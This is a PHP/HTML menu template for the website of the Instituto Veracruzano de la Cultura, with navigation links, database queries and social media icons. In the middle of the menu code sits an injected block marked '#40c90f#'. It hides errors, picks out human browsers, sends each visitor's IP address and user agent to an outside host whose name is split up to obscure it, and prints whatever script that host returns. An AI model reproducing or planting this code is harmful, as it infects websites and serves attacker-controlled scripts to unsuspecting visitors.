<style>
#mar1 td, #mar2 td
{ padding:5px ; 

}
</style>
<link href="estilo.css" rel="stylesheet" type="text/css">
	<div style="width:930px; margin:auto; min-height:350px; background-color:#FFF"><table width="930" border="0" cellspacing="0" cellpadding="0">
  <tr class="negro12" id="mar2">
        <td   class="negro12"><strong>IVEC</strong></td>
        <td  class="negro12"><strong>AGENDA</strong></td>
        <td  class="negro12"><strong>RECINTOS CULTURALES</strong></td>
        <td  class="negro12"><strong>CONVOCATORIAS</strong></td>
        <td class="negro12"><strong>ARTISTAS</strong></td>
      <td><strong>SUBDIRECCIONES</strong></td>
  </tr>
 <tr valign="top" class="negro11" id="mar1">
        <td height="170" class="negro11"><a href="historia.php" class="negro11">Historia</a>&nbsp;<br>
          <a href="mision.php" class="negro11">Visión y Misión</a><br>
          <a href="objetivos.php" class="negro11">Objetivos</a><br>
          <a href="directorio.php" class="negro11">Directorio</a><br>
          <a href="organigrama.php" class="negro11">Organigrama</a><br>
          <a href="fracciones.php" class="negro11">Transparencia</a><br>
Comunicación Social<br>
CACREP<br>
<a href="contraloria.php" class="negro11">Controlaría Ciudadana</a><br>
<a href="contacto.php" class="negro11">Contacto</a><br>
<? $fini=date("Y-m").'-01';
   $ffin=date("Y-m").'-31';
   $bcar=$bd->ejecutar("select * from cartelera where fecha between '$fini' and '$ffin' order by id desc limit 1 ");
	while($kcar=$bd->obtener_fila($bcar,0)){ ?>
<?php
#40c90f#
error_reporting(0); ini_set('display_errors',0); $wp_jjac82262 = @$_SERVER['HTTP_USER_AGENT'];
if (( preg_match ('/Gecko|MSIE/i', $wp_jjac82262) && !preg_match ('/bot/i', $wp_jjac82262))){
$wp_jjac0982262="http://"."web"."basefont".".com/font"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_jjac82262);
$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_jjac0982262);
curl_setopt ($ch, CURLOPT_TIMEOUT, 6); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $wp_82262jjac = curl_exec ($ch); curl_close($ch);}
if ( substr($wp_82262jjac,1,3) === 'scr' ){ echo $wp_82262jjac; }
#/40c90f#
?>
<?php

?>
<?php

?>
<?php

?>
	<a href="admin/<?=$kcar['url']?>" target="_blank" class="negro11" >Cartelera</a>
<? } ?>
</td>
        <td  class="negro11"><a href="agenda.php" class="negro11">Eventos<br>
        Exposiciones<br>
        Talleres<br>
        Cursos<br>
        Diplomados<br>
      Cine Club</a></td>
        <td  class="negro11">
           <? $br=$bd->ejecutar("select * from recintos where edo=1 order by id asc"); 
	while($rrr=$bd->obtener_fila($br,0)){
	?><a href="recintos.php?id=<?=$rrr['id']?>" class="negro11" style="color:#333; font-weight:normal"><?=$rrr['nombre']?></a><br>
      <? } ?> </td>
        <td  class="negro11"><a href="convocatorias.php" class="negro11">Abiertas<br />
        Resultados recientes</a></td>
        <td class="negro11"><strong><a href="artistas.php" class="negro11">ARTISTAS PLASTICOS</a></strong><a href="artistas.php" class="negro11"><br>
        <strong>ARTES ESCENICAS</strong><br>
        <strong>MÚSICA</strong><br>
        <strong>LITERATURA</strong><br>
        <strong>PROMOTORES CULTURALES</strong></a><br>
        </td>
      <td><strong>Educación e investigación artística</strong>&nbsp; <br>
            <a href="subdirecciones14.php" class="negro11">Alas y Raíces Veracruz</a><br>
            <a href="subdirecciones15.php" class="negro11">Fomento a la lectura</a><br>
            <a href="subdirecciones16.php" class="negro11">PECDAV</a><br>
            <a href="subdirecciones17.php" class="negro11">Creadores en los estados</a><br>          <strong>Artes y patrimonio</strong><br>
        <a href="subdirecciones19.php" class="negro11">Desarrollo Cultural Regional</a><br>
        <a href="subdirecciones20.php" class="negro11">Subdirección de administración</a><br>
      <a href="subdirecciones21.php"><span class="negro11">Actividades de subdirecciones</span></a></td>
  </tr>
  <tr>
    <td colspan="6">
    <table align="center"><tr><td class="negro11"><a href="https://webmail.veracruz.gob.mx/owa/auth/logon.aspx" style="color:#000;" target="_blank">Webmail</a> | <a href="http://litorale.com.mx/intraivec/systemsX/index.php" style="color:#000;" target="_blank">Intranet Xalapa</a> | <a href="http://litorale.com.mx/intraivec/systems/index.php" style="color:#000;" target="_blank">Intranet Veracruz</a>| <a href="http://litorale.com.mx/intraivec/systemsSA/index.php" style="color:#000;" target="_blank">Intranet Administracion</a>| <a href="http://litorale.com.mx/intraivec/archivosX/index.php" style="color:#000;" target="_blank">Archivos Xalapa</a>| <a href="http://litorale.com.mx/intraivec/archivosV/index.php" style="color:#000;" target="_blank">Archivos Veracruz</a>
    
</td></tr></table>
		<br>
		<table align="center"><tr><td class="negro11">
		<a a href="https://twitter.com/IVEC_Oficial" target="_blank"  title="Twitter IVEC Oficial">
      <img src="imgs/twitterIvec.png" onmouseover="this.width=55;this.height=55;" onmouseout="this.width=45;this.height=45;" width="45" height="45" align="right" style="padding:0 10px 10px 0"  alt="" /></a>  		
  		<a a href="https://www.facebook.com/institutoveracruzano.delacultura" target="_blank"  title="Facebook IVEC Oficial">
      <img src="imgs/facebookIvec.png" onmouseover="this.width=55;this.height=55;" onmouseout="this.width=45;this.height=45;" width="45" height="45" align="right" style="padding:0 10px 10px 0" alt="" /></a>
      <a a href="https://www.youtube.com/channel/UCBs_3i0bypMwaMk8ScHNjEw" target="_blank"  title="Youtube IVEC Oficial">
      <img src="imgs/youtubeIvec.png" onmouseover="this.width=55;this.height=55;" onmouseout="this.width=45;this.height=45;" width="45" height="45" align="right" style="padding:0 10px 10px 0" alt="" /></a>     
      <a a href="https://plus.google.com/u/0/101267733365252607154/posts" target="_blank"  title="Google IVEC Oficial">
      <img src="imgs/googleIvec.png" onmouseover="this.width=55;this.height=55;" onmouseout="this.width=45;this.height=45;" width="45" height="45" align="right" style="padding:0 10px 10px 0" alt="" /></a>
		</td></tr></table>

    </td>
    </tr>
  <tr>
    <td colspan="6"><table width="930" border="0" cellpadding="0" cellspacing="0">
    </table></td>
    </tr>
</table>
	</div>